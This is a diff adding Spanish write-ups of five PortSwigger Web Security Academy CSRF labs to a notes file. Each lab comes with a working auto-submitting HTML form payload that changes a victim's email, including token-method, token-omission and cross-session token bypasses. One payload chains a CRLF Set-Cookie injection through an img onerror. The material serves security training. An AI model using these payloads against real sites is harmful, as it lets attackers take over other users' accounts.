@@ -298,6 +298,136 @@ Si puede manipular este gadget para obtener una solicitud secundaria maliciosa, 
 Tenga en cuenta que no es posible realizar un ataque equivalente con redirecciones del lado del servidor. En este caso, los navegadores reconocen que la solicitud para seguir la redirección se originó inicialmente a partir de una solicitud entre sitios, por lo que aún aplican las restricciones de cookies correspondientes.
 
 
-## Reto 1:
+## Reto 1: Vulnerabilidad CSRF sin defensas
 
 
+La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.
+
+Para resolver el laboratorio, cree un código HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador y cárguelo en su servidor de exploits.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+En caso básico de vulnerabilidad CSRF, en el que una funcionalidad sensible el cambio de correo electrónico carece de cualquier tipo de protección. Esto nos permite forzar acciones en la cuenta de un usuario autenticado simplemente haciendo que cargue una página con un formulario oculto y autoenviado.
+
+La técnica consiste en construir una petición POST con los mismos parámetros que la funcionalidad legítima, y luego alojarla en el servidor de explotación proporcionado. Al incluir un pequeño script que autoenvía el formulario al cargar la página, conseguimos que la víctima realice la acción sin saberlo, usando su propia sesión activa.
+
+```html
+<form class="login-form" name="change-email-form" action="https://0af000540454b65c80ac0d1900590082.web-security-academy.net/my-account/change-email" method="POST">
+<label>Email</label>
+<input  type="hidden" name="email" value="hacked@hacked.com">
+</form>
+<script> 
+document.forms[0].submit();
+</script>
+```
+
+## Reto 2 :CSRF donde la validación del token depende del método de solicitud
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta bloquear ataques CSRF, pero solo aplica defensas a ciertos tipos de solicitudes.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+La aplicación implementa una defensa basada en tokens pero solo la aplica cuando la petición utiliza el método POST. Si el mismo endpoint es accedido mediante GET, la validación del token queda desactivada.
+
+Aprovechamos esta inconsistencia cambiando el método de la solicitud de POST a GET. De este modo, no es necesario incluir un token válido, y la petición de cambio de correo electrónico es aceptada siempre que el usuario esté autenticado.
+
+Utilizamos un formulario HTML alojado en el servidor de explotación, que se autoenvía al cargarse y realiza una petición GET con los parámetros necesarios. Como el servidor no exige el token en este contexto, la modificación se lleva a cabo con éxito, demostrando que el control de CSRF es incompleto.
+
+
+```html
+<form class="login-form" name="change-email-form" action="https://0adb00bc04eb31598086fd7300ba00d5.web-security-academy.net/my-account/change-email" method="GET">
+<label>Email</label>
+<input  type="hidden" name="email" value="hacked@hacked.com">
+</form>
+<script> 
+document.forms[0].submit();
+</script>
+```
+
+## Reto 3: 
+CSRF donde la validación del token depende de la presencia del token
+
+La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+donde la protección solo entra en juego si el parámetro csrf está incluido en la solicitud.
+
+Mediante el análisis de las respuestas del servidor en Burp Suite, observamos que cuando el token es incorrecto, la solicitud es rechazada, pero si directamente eliminamos el parámetro, la validación desaparece y la operación se ejecuta correctamente.
+
+Aprovechamos este fallo lógico para construir un ataque CSRF que omite por completo el campo csrf, lo cual permite modificar la dirección de correo electrónico del usuario víctima sin necesidad de conocer ni manipular un token válido.
+
+```html
+<form class="login-form" name="change-email-form" action="https://0a8e00fa03edaaeb80b5035600600075.web-security-academy.net/my-account/change-email" method="POST">
+<label>Email</label>
+<input  type="hidden" name="email" value="hacked@hacked.com">
+</form>
+<script> 
+document.forms[0].submit();
+</script>
+```
+
+## Reto 4: CSRF donde el token está vinculado a una cookie que no es de sesión
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Utiliza tokens para intentar prevenirlos, pero no están completamente integrados en el sistema de gestión de sesiones del sitio.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Tienes dos cuentas en la aplicación que puedes usar para diseñar tu ataque. Las credenciales son las siguientes:
+wiener:peter carlos:montoya
+
+Nos encontramos con una implementación de tokens CSRF que no están vinculados a la sesión del usuario. Esto significa que cualquier token válido puede ser utilizado por cualquier usuario, sin importar quién lo haya recibido originalmente.
+
+Para explotar esta debilidad:
+
+Iniciamos sesión con un usuario y capturamos un token CSRF desde la funcionalidad de cambio de correo electrónico.
+Luego, iniciamos sesión con otro usuario y utilizamos ese token previamente obtenido para enviar una solicitud de cambio de correo.
+El servidor acepta el token aunque no pertenezca a esa sesión, lo que permite realizar el ataque CSRF.
+
+```html
+<form class="login-form" name="change-email-form" action="https://0ab200c00322e25f81d9575600db0021.web-security-academy.net/my-account/change-email" method="POST">
+ <input  type="hidden" name="email" value="hacked@hacked.com">
+<input required="" type="hidden" name="csrf" value="4vSpTeNT9XiWLd1Wrl0oTZl09FOteA1A"> (valor csrf de otra cuenta)
+ </form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+## Reto 5:
+
+CSRF donde el token está vinculado a una cookie que no es de sesión
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Utiliza tokens para intentar prevenirlos, pero no están completamente integrados en el sistema de gestión de sesiones del sitio.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Tienes dos cuentas en la aplicación que puedes usar para diseñar tu ataque. Las credenciales son las siguientes:
+wiener:peter
+carlos:montoya
+
+
+En este laboratorio, el token CSRF está vinculado a una cookie (csrfKey), pero esta cookie no está realmente ligada a la sesión de usuario, lo que permite suplantar el valor.
+
+Para explotarlo:
+- Iniciamos sesión con un usuario y capturamos tanto el valor del csrfKey como el token CSRF.
+- Probamos que el servidor acepta esos valores incluso cuando son usados por otro usuario, es decir, no hay una validación estricta entre token, cookie y sesión.
+- Además, observamos que la funcionalidad de búsqueda refleja cabeceras Set-Cookie, lo que nos permite inyectar cookies arbitrarias en el navegador víctima.
+- Montamos un exploit que:
+    - Realiza una búsqueda maliciosa para setear la cookie csrfKey deseada.
+    - Luego, una vez inyectada, envía el formulario con el token capturado, consiguiendo cambiar el email de la víctima.
+
+
+
+
+<form class="login-form" name="change-email-form" action="https://0ab000ad03b528c2804e494300ab003f.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="setensa@setensa.com">
+    <input type="hidden" name="csrf" value="pCGHRoz1Ojj2I3PcpNZXXnrm0Hg7a9pv">
+</form>
+
+<img src="https://0ab000ad03b528c2804e494300ab003f.web-security-academy.net/?search=prueba%0d%0aSet-Cookie:csrfKey=icFb4T1G90YQOOcY9djppswJCSCqjNGs%3b%20SameSite=None" onerror="document.forms[0].submit();">
